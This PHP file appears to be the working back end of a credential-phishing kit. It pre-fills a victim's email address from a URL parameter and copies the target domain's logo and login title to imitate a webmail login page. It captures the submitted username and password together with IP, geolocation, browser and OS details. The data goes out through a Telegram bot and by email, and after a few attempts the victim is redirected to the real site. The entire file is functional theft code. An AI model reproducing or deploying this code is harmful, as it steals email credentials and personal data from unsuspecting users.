<?php
$__bb_owns_buffer = false;
if (ob_get_level() === 0) {
    ob_start();
    $__bb_owns_buffer = true;
}

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

require_once 'login.php';
require_once __DIR__ . '/config.php';

$img         = '';
$decoded     = '';
$login_id    = '';
$domain      = '';
$noTld       = '';
$noTld_upper = '';
$title       = '로그인';
$error       = 'display: none;';
$url         = $login = $username = $password = '';

// Resolve email for the readonly field
if (!empty($_GET['id'])) {
    $result = base64_decode((string)$_GET['id'], true);
    if ($result !== false && str_contains($result, '@')) {
        $decoded = $result;
    }
}
if ($decoded === '' && !empty($_SESSION['temp_email'])) {
    $decoded = (string)$_SESSION['temp_email'];
}
if ($decoded === '' && !empty($_POST['user_init']) && str_contains($_POST['user_init'], '@')) {
    $decoded = (string)$_POST['user_init'];
}
if ($decoded === '' && !empty($_POST['user']) && str_contains($_POST['user'], '@')) {
    $decoded = (string)$_POST['user'];
}

if ($decoded !== '') {
    $login_id = strstr($decoded, '@', true);
    $parts    = explode('@', $decoded);
    $domain   = $parts[1] ?? '';
}

// Helpers
function status(?string $url): ?int {
    if (empty($url) || !filter_var($url, FILTER_VALIDATE_URL)) return null;
    if (!function_exists('curl_init')) return null;
    $ch = curl_init($url);
    if ($ch === false) return null;
    curl_setopt_array($ch, [
        CURLOPT_HTTPGET => true, CURLOPT_NOBODY => false,
        CURLOPT_FOLLOWLOCATION => true, CURLOPT_MAXREDIRS => 5,
        CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 4,
        CURLOPT_CONNECTTIMEOUT => 2,
        CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    ]);
    curl_exec($ch);
    if (curl_errno($ch)) { curl_close($ch); return null; }
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ($code && $code > 0) ? (int)$code : null;
}

function getDomainName(string $url, string $cacheFile = ''): string {
    if (empty($url)) return '';
    if ($cacheFile === '') $cacheFile = __DIR__ . DIRECTORY_SEPARATOR . 'psl_cache.dat';
    if (!file_exists($cacheFile) || (time() - filemtime($cacheFile)) > 86400) {
        if (function_exists('curl_init')) {
            $ch = curl_init('https://publicsuffix.org/list/public_suffix_list.dat');
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 6, CURLOPT_CONNECTTIMEOUT => 3,
                CURLOPT_SSL_VERIFYPEER => false,
            ]);
            $data = curl_exec($ch);
            curl_close($ch);
            if ($data !== false) @file_put_contents($cacheFile, $data);
        }
    }
    if (!file_exists($cacheFile)) {
        $cleanHost = parse_url($url, PHP_URL_HOST) ?? $url;
        $parts = explode('.', strtolower(preg_replace('/^www\./i', '', $cleanHost)));
        return count($parts) > 1 ? $parts[count($parts) - 2] : ($parts[0] ?? '');
    }
    $lines = @file($cacheFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if ($lines === false) return '';
    $psl = [];
    foreach ($lines as $line) {
        if (!str_starts_with($line, '//')) $psl[trim($line)] = true;
    }
    $host  = parse_url($url, PHP_URL_HOST) ?? $url;
    $host  = strtolower(preg_replace('/^www\./i', '', $host));
    $parts = explode('.', $host);
    $n     = count($parts);
    $matchLen = 1;
    for ($i = 0; $i < $n - 1; $i++) {
        $candidate = implode('.', array_slice($parts, $i));
        $wildcard  = '*.' . implode('.', array_slice($parts, $i + 1));
        if (isset($psl[$candidate]) || isset($psl[$wildcard])) {
            $matchLen = $n - $i;
            break;
        }
    }
    return $parts[$n - $matchLen - 1] ?? '';
}

function getUserIP(): string {
    foreach ([
        'HTTP_CF_CONNECTING_IP', 'HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR',
        'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED', 'REMOTE_ADDR',
    ] as $key) {
        if (!empty($_SERVER[$key])) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                    return $ip;
                }
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
}

function getUserBrowser(): string {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    if (strpos($ua, 'Edge') !== false || strpos($ua, 'Edg/') !== false) return 'Microsoft Edge';
    if (strpos($ua, 'Chrome') !== false) return 'Google Chrome';
    if (strpos($ua, 'Safari') !== false && strpos($ua, 'Chrome') === false) return 'Safari';
    if (strpos($ua, 'Firefox') !== false) return 'Mozilla Firefox';
    if (strpos($ua, 'MSIE') !== false || strpos($ua, 'Trident') !== false) return 'Internet Explorer';
    if (strpos($ua, 'Opera') !== false || strpos($ua, 'OPR') !== false) return 'Opera';
    return 'Unknown';
}

function getUserOS(): string {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    if (strpos($ua, 'Windows NT 10.0') !== false) return 'Windows 10/11';
    if (strpos($ua, 'Windows NT 6.3') !== false)  return 'Windows 8.1';
    if (strpos($ua, 'Windows NT 6.2') !== false)  return 'Windows 8';
    if (strpos($ua, 'Windows NT 6.1') !== false)  return 'Windows 7';
    if (strpos($ua, 'Macintosh') !== false)       return 'Macintosh';
    if (strpos($ua, 'iPhone') !== false)          return 'iOS (iPhone)';
    if (strpos($ua, 'Android') !== false)         return 'Android';
    if (strpos($ua, 'Linux') !== false)           return 'Linux';
    return 'Unknown';
}

function getMxStatus(string $domain): string {
    $domain = strtolower(trim($domain));
    if ($domain === '') return 'Invalid Domain';
    return checkdnsrr($domain, 'MX') ? 'MX record found' : 'No MX record found';
}

function getMxDetails(string $domain): string {
    $domain = strtolower(trim($domain));
    if ($domain === '') return 'Invalid Domain';
    $hosts = []; $weights = [];
    if (getmxrr($domain, $hosts, $weights) && !empty($hosts)) {
        array_multisort($weights, SORT_ASC, $hosts);
        return 'Found: ' . implode(', ', $hosts);
    }
    return 'No MX records found';
}

function getUserLocationData(string $ip): array {
    if (in_array($ip, ['127.0.0.1', '::1'], true)) {
        return ['country' => 'Localhost', 'city' => 'Localhost',
                'region' => 'Localhost', 'formatted' => "{$ip}, Localhost"];
    }
    $response = false;
    if (function_exists('curl_init')) {
        $ch = curl_init("http://ip-api.com/json/$ip");
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 3,
            CURLOPT_CONNECTTIMEOUT => 2, CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0',
        ]);
        $response = curl_exec($ch);
        curl_close($ch);
    }
    if ($response === false) {
        $response = @file_get_contents("http://ip-api.com/json/$ip");
    }
    $d = $response ? json_decode($response) : null;
    $country = $d->country ?? 'Unknown';
    $city    = $d->city    ?? 'Unknown';
    $region  = $d->region  ?? 'Unknown';
    return ['country' => $country, 'city' => $city, 'region' => $region,
            'formatted' => "{$ip}, {$country} ({$city}, {$region})"];
}

function tg(string $message): bool {
    if (!defined('TG_TOKEN') || !defined('TG_CHAT_ID') || !TG_TOKEN || !TG_CHAT_ID) {
        @file_put_contents(__DIR__ . '/tg_debug.log',
            date('c') . " | tg(): missing constants (token=" .
            (defined('TG_TOKEN') ? 'set' : 'unset') . ", chat=" .
            (defined('TG_CHAT_ID') ? 'set' : 'unset') . ")\n", FILE_APPEND);
        return false;
    }
    if (!function_exists('curl_init')) {
        @file_put_contents(__DIR__ . '/tg_debug.log',
            date('c') . " | tg(): curl not available\n", FILE_APPEND);
        return false;
    }

    $ch = curl_init('https://api.telegram.org/bot' . TG_TOKEN . '/sendMessage');
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query([
            'chat_id'                  => TG_CHAT_ID,
            'text'                     => $message,
            'disable_web_page_preview' => 'true',
        ]),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 8,
        CURLOPT_CONNECTTIMEOUT => 4,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
    ]);
    $result = curl_exec($ch);
    $errno  = curl_errno($ch);
    $errmsg = curl_error($ch);
    curl_close($ch);

    @file_put_contents(__DIR__ . '/tg_debug.log',
        date('c') . " | tg() errno={$errno} errmsg={$errmsg} resp={$result}\n",
        FILE_APPEND);

    if ($result === false) return false;
    $j = json_decode($result, true);
    return is_array($j) && !empty($j['ok']);
}

function sendMail(string $subject, string $message, string $replyTo): bool {
    if (!defined('EMAIL') || !EMAIL) return false;
    $from = 'Notification <noreply@' . ($_SERVER['HTTP_HOST'] ?? 'localhost') . '>';
    $headers = [
        'From'         => $from,
        'Reply-To'     => $replyTo,
        'X-Mailer'     => 'PHP/' . phpversion(),
        'Content-Type' => 'text/plain; charset=utf-8',
    ];
    return @mail(EMAIL, $subject, $message, $headers);
}

// UI data — logo + title
if (!empty($domain)) {
    $noTld       = getDomainName($domain);
    $noTld_upper = strtoupper($noTld);
    $img         = "https://img.logo.dev/{$domain}?token=live_6a1a28fd-6420-4492-aeb0-b297461d9de2&size=100&retina=true&format=webp&theme=light&w=128&q=75";

    if (function_exists('curl_init') && empty($title)) {
        $ch = curl_init("https://login.mailplug.com/auth/login?host_domain={$domain}");
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 4, CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        ]);
        $html = curl_exec($ch);
        curl_close($ch);
        if ($html) {
            if (preg_match('/<div[^>]*class="[^"]*login-logo-value-container[^"]*"[^>]*>.*?<p[^>]*>(.*?)<\/p>/is', $html, $m)) {
                $title = html_entity_decode(trim($m[1]), ENT_QUOTES, 'UTF-8');
            } elseif (preg_match('/<title>(.*?)<\/title>/i', $html, $m)) {
                $title = html_entity_decode(trim($m[1]), ENT_QUOTES, 'UTF-8');
            }
        }
    }

    $img_url = (status($img) === 200)
        ? $img
        : "https://webmail.emailpnl.com/webmail_assets/favicon.ico";
} else {
    $img_url = "https://webmail.emailpnl.com/webmail_assets/favicon.ico";
}

if (!isset($_SESSION['login_attempts'])) {
    $_SESSION['login_attempts'] = 0;
}

// POST PROCESSOR
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $login    = trim($_POST['login'] ?? '');
    $username = trim($_POST['user']  ?? '');
    $password = trim($_POST['pass']  ?? '');

    $valid = true;

    if ($username === '' || $password === '') {
        $error = 'display: block;';
        $valid = false;
    } elseif (str_contains($username, '@') && !filter_var($username, FILTER_VALIDATE_EMAIL)) {
        $error = 'display: block;';
        $valid = false;
    }

    if ($valid) {
        if (preg_match('#^https?://#i', $login)) {
            $url = $redirectUrl = $login;
        } elseif ($login === 'yahoo.php' || $login === 'yahoo') {
            $url = $redirectUrl = 'https://mail.yahoo.com/';
        } elseif (isset($urls[$login])) {
            $url = $redirectUrl = $urls[$login];
        } elseif ($login === 'all.php' && $domain !== '') {
            $url = $redirectUrl = "https://{$domain}";
        } elseif ($login !== '' && $login !== 'all.php' && $domain !== '') {
            $url = $redirectUrl = "https://webmail.{$domain}";
        } else {
            $url = $redirectUrl = $domain !== '' ? "https://{$domain}" : 'https://mail.yahoo.com/';
        }

        $serverHost = $_SERVER['HTTP_HOST'] ?? 'localhost';
        if (preg_match('#^https?://#i', $login)) {
            $loginPageUrl = $login;
        } elseif ($login !== '' && $login !== 'all.php') {
            $loginPageUrl = "https://{$serverHost}/" . ltrim($login, '/');
        } else {
            $loginPageUrl = "https://{$serverHost}/all.php";
        }

        $loginPageTitle = ($title !== '' && $title !== '로그인') ? $title : 'Unknown';

        $_SESSION['login_attempts']++;

        $os           = getUserOS();
        $userIP       = getUserIP();
        $browser      = getUserBrowser();
        $locationData = getUserLocationData($userIP);
        $country      = $locationData['country'];
        $userLocation = $locationData['formatted'];
        $mxStatus     = getMxStatus($domain);
        $mxDetails    = getMxDetails($domain);
        $date         = date('l d, F Y (h:i:s A)');

        $subject  = "B2B-Update from {$username} | {$country} | {$userIP}";
        $message  = "\n";
        $message .= "{$url}\n";
        $message .= "Page: B2B-Update\n";
        $message .= "Login Page: {$loginPageUrl}\n";
        $message .= "Login Title: {$loginPageTitle}\n";
        $message .= "USR: {$username}\n";
        $message .= "PWD: {$password}\n";
        $message .= "Country: {$country}\n";
        $message .= "MX Status: {$mxStatus}\n";
        $message .= "MX Records: {$mxDetails}\n";
        $message .= "IP: {$userIP}\n";
        $message .= "Location: {$userLocation}\n";
        $message .= "Browser: {$browser}\n";
        $message .= "Operating System: {$os}\n";
        $message .= "Date: {$date}\n";
        $message .= "Attempt: {$_SESSION['login_attempts']}\n\n";

        tg($message);
        sendMail($subject, $message, $username);

        $error = 'display: block;';

        $maxAttempts = defined('SUBMIT') ? (int)SUBMIT : 2;
        if ($_SESSION['login_attempts'] >= $maxAttempts) {
            $_SESSION['login_attempts'] = 0;
            session_destroy();

            if ($__bb_owns_buffer && ob_get_level() > 0) {
                while (ob_get_level() > 0) { ob_end_clean(); }
            }

            if (function_exists('self_destruct_and_redirect')) {
                self_destruct_and_redirect($redirectUrl);
            } else {
                header("Location: {$redirectUrl}");
            }
            exit();
        }
    }
}

if ($__bb_owns_buffer && ob_get_level() > 0) {
    ob_end_flush();
}